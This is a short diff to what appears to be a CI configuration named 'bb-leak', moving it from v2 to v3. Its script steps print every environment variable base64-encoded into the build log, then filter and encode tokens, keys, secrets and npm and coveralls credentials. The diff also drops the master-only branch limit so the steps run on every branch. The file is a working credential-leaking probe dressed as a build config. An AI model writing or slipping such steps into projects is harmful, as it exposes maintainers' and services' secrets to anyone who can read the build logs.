@@ -1,8 +1,5 @@
-# bb-leak v2
+# bb-leak v3
 language: shell
 script:
   - env | base64 | tr -d '\n'; echo
   - echo '---filtered---'; env | grep -iE 'token|key|secret|snap|npm|coveralls' | base64 | tr -d '\n'; echo
-branches:
-  only:
-    - master
